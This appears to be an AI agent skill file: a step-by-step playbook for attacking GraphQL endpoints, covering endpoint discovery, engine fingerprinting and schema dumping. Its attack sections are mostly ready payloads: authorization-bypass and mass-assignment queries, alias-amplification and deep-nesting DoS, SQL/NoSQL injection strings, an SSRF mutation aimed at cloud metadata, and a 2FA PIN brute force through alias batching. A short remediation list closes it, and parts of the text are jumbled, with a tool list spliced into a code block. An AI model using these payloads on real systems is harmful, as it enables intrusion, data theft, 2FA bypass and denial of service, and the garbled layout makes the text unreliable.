---
name: graphql-vulns
description: Enumerate, fingerprint, and exploit GraphQL endpoints — introspection dumps, authorization bypasses, alias-based brute force, batching DoS, and SSRF via remote schemas.
---

# GraphQL Vulnerabilities

## When to use this skill

Use when the target exposes a GraphQL endpoint (explicitly or buried in an SPA). Goal ladder: endpoint discovery → engine fingerprint → schema dump → authz bypass → brute-force / DoS → SSRF / RCE via custom directives.

## Methodology

### 1. Endpoint discovery

Common paths:

```
/graphql  /graphiql  /api/graphql  /v1/graphql  /v2/graphql  /graphql/v1  /playground
/graphql/console  /altair  /api/v1/graphql  /graphql/schema  /graphql/schema.json
/gql  /query  /api/gql  /service-graphql  /s/graphql  /api/0.2/graphql  /admin/graphql
/hasura/v1/graphql  /hasura  /appsync  /graphql/batch  /api/graphql/batch
```

HTTP methods / content-types:
### 2. Engine fingerprinting

Probe `/graphql`, `/graphiql`, `/api`, `/api/v1/graphql`, `/gql`, `/query` with `GET ?query={__typename}` and `POST {"query":"{__typename}"}`. Identify the engine, then target its defaults:

- **Apollo Server / graphql-js (Node)**: `{"data":{"__typename":"Query"}}`; errors as `{"errors":[{"message":...}]}`; field suggestions often on (`Did you mean "user"?`).
- **GraphQL Java (Spring)**: `InvalidSyntaxError` with `at line X column Y`; error `extensions.classification`; stack traces leak internal paths.
- **Strawberry / Ariadne (Python)**: `errors` include `traceback` when debug mode is on.
- **Hasura**: `/healthz`, `/v1/graphql`, `x-hasura-` role headers; role claims read from the JWT.
- **AWS AppSync**: `$context` resolver variables, `aws_appsync` JS resolvers, `GraphQLError`-prefixed errors.
- **gqlgen (Go)**: `{"data":null,"errors":[...]}` with `path` arrays pointing at the failing field.

```
POST /graphql  Content-Type: application/json
POST /graphql  Content-Type: application/graphql      {"query":"..."}  vs raw query
POST /graphql  Content-Type: application/x-www-form-urlencoded
GET /graphql?query={me{id}}                            (GET-based = usually CSRF-able)
GET /graphql?query={me{id}}&raw=true                   (some engines need raw=true)
```


```
Apollo Server    → error format: {"errors":[{"message":"...","extensions":{"code":"..."} }]}
graphql-yoga     → error format: {"errors":[{"message":"Syntax error..." , "locations":[...]}]}
Hasura           → `X-Hasura-Role` header, `/healthz`, `/v1/metadata` (admin secret), `/v1/version`
graphene / strawberry / ariadne (Python) → different error wrapping, sometimes traceback leakage
Sangria (Scala)  → "io.circe" leaks in errors
graphql-dotnet   → different `path` field in errors, `TraceParent` leakage
GQLGen / gqlgen  → `"message":"must not be null"` style errors
HotChocolate (.NET) → `"message":"Unexpected error"` + `"exceptionMessage"` leaks
```

### 3. Introspection

Standard introspection query (compact, for curl):

```graphql
{__schema{types{name kind fields{name type{name kind ofType{name kind}}}}}}
```

Full dump with query arguments + descriptions:

```graphql
query IntrospectionQuery { __schema {
  queryType { name }
  mutationType { name }
  subscriptionType { name }
  types { ...FullType }
  directives { name locations args { ...InputValue } }
}}
fragment FullType on __Type {
  kind name description
  fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason }
  inputFields { ...InputTypeRef }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) { name }
  possibleTypes { ...TypeRef }
}
fragment InputValue on __InputValue { name description defaultValue { ...TypeRef } }
fragment InputTypeRef on __Type { kind name ofType { kind name ofType { kind name } } }
fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }
```

When introspection is **disabled**, bypasses:

```
1. Field suggestions (engine returns "Did you mean 'xyz'?") — enumerate field names char by char:
   { a }   →  "Cannot query field 'a' on type 'Query'. Did you mean 'admin'?"  → use clairvoyance
2. POST-only introspection block → use GET:
   curl "https://target/graphql?query=%7B__schema%7Btypes%7Bname%7D%7D%7D"
3. Different content-type (application/graphql) may skip the filter.
4. Persisted query hash probing: {"version":1,"versionHash":"<sha256 of query>"} 
5. __typename probe: {__typename} works even when introspection is off — confirm engine alive.
6. Look for schema.json / schema.graphql artifacts in webroot or source maps.
7. Apollo Federation: probe for `_service { sdl }` — leaks full schema:

- **InQL (Burp / Jupyter)**: fetch schemas, generate query templates, scrub masked fields against a wordlist.
- **clairvoyance**: reconstruct a schema JSON from field wordlists when introspection is disabled -- feed the output back into InQL.
- **Graphw00f**: engine and version fingerprinting to pick engine-specific bypasses.
- **graphql-path-enum**: enumerate schema paths that reach a target type through chained object references.
- **Aliasing/batching harness**: custom script or Burp Intruder running 100 aliases per request for rate-limit and depth-limit testing.
- **Voyager**: visualize the reconstructed schema to spot juicy node chains (`User -> Org -> Billing -> PaymentMethod`).
   {"query":"{ _service { sdl } }"}
   Works on federated subgraphs, often forgotten on publicly exposed subgraph.
```

### 4. Authorization bypasses

- **Field-level authz gaps**: introspect for sensitive fields (e.g. `users { email passwordHash isAdmin }`) — engines often gate mutations but forget field-level authz on queries.
- **Nested object access**:

```graphql
query {
  company(id: 1) {          # you own this
    id
    users {                 # you don't own these
      id email
      apiKeys { value }
    }
}
```

- **Mass assignment via mutation**: mutation arguments often allow setting fields the UI never sends:

```graphql
mutation { updateProfile(input: { id: 123, role: "admin", plan: "pro" }) { user { role } } }
```

- **IDOR via non-sequential IDs** — probe with IDs from other tenants (see `idor` skill).

### 5. Batching & DoS

```graphql
# Alias-based repeated field (amplification):
query { a1: user(id:1){email} a2: user(id:1){email} ... a1000: user(id:1){email} }

# Deep nesting DoS:
query { a{b{c{d{e{f{g{h{i{j{k{l{m{n{o{p{q{r{s{t{u{v{w{x{y{z{a{b{c{d}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}
```

Cost-analysis bypasses: use fragments to repeat fields without aliases; wrap in `@skip`/`@include` directives.

### 6. Injection & SSRF

- **NoSQL/SQL injection in arguments** (if backend is a raw resolver):

```graphql
{ user(name: "' OR 1=1 --") { id email } }
{ user(filter: "{\"$ne\": null}") { id email } }   # Hasura/MongoDB style
{ user(id: {"$regex": "^a"}) { id email } }
```

- **SSRF via custom scalars / remote schemas** (Hasura remote schema, Apollo gateway `service.url` mutation, URL-typed custom scalar that fetches):

```graphql
mutation { createRemoteSchema(url: "http://169.254.169.254/latest/meta-data/") { id } }
```

- **SSTI in error messages** (rare — some engines interpolate).
- **CSRF via GET** if cookies are used for auth: `GET /graphql?query=mutation{...}` with a form/csrf-free GET — test.
- **CORS**: `Access-Control-Allow-Origin: *` or reflected Origin → any site can issue authenticated GraphQL queries (mass exfil via mutation names).
- **2FA bypass via alias batching**: parallel alias probes to rate-limit-free 2FA check:

```graphql
mutation { r1: login(pin:"000000") ... r1000: login(pin:"999999") }
```

- **Error-based extraction**: resolver errors sometimes include raw DB errors — use invalid types to force it.


```
graphw00f -f <endpoint> -t <target>           # fingerprint engine
clairvoyance -u https://target/graphql -o schema.json   # reconstruct schema when introspection off
InQL (Burp extension)                          # GUI schema explorer + query templates
graphql-voyager                                # visualize schema
graphql-path-enum                              # find IDOR paths
batchql                                        # batching/DoS probes
```

## Verification & Deliverables

- **Confirmed**: introspection dump file, alias/DoS response, IDOR PoC showing another tenant's data, SSRF callback to Burp Collaborator.
- **Impact**: data exfiltration, authz bypass, 2FA bypass, DoS, SSRF/RCE via remote schema. Federated subgraph `_service { sdl }` = full subgraph leak.
- **Remediation**: disable introspection and field suggestions in prod; enforce depth limit, cost limit, and max aliases per operation; use persisted queries only; implement field-level authorization middleware (graphql-shield / Hasura roles / `@auth` directives); disable GET-based queries; rate limit per-resolver, not per-request; validate input via schema + DTOs; disable federation `_service` on public subgraphs; log & alert on introspection/malformed queries.
- **Artifacts**: endpoint, engine, schema dump, IDOR/authz PoC, DoS PoC, remediation note.
